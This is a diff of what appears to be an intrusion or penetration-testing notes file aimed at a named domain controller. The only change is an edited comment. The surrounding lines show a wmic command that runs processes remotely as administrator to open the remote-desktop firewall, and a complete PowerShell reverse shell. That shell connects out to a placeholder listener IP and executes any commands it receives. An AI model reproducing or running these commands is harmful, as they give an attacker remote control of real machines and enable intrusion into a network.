@@ -14,7 +14,7 @@ $pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administ
 # we thought our problems were from us potentially being removed from the RDP users group, so we added ourself back
 $pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administrator /password:$pass process call create "cmd.exe /c netsh advfirewall firewall set rule group='remote desktop' new enable=yes"
 
-# we tried using a publicly available powershell reverse shell to get a full shell to the machine, ran into issues with escape characters, etc
+# we tried using a publicly available powershell reverse shell to get a full shell to the machine, ran into issues with non-escaped characters, etc
 powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('<LISTENERIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 # tried downloading a file from a linux server, then check nginx access logs to verify that commands were working
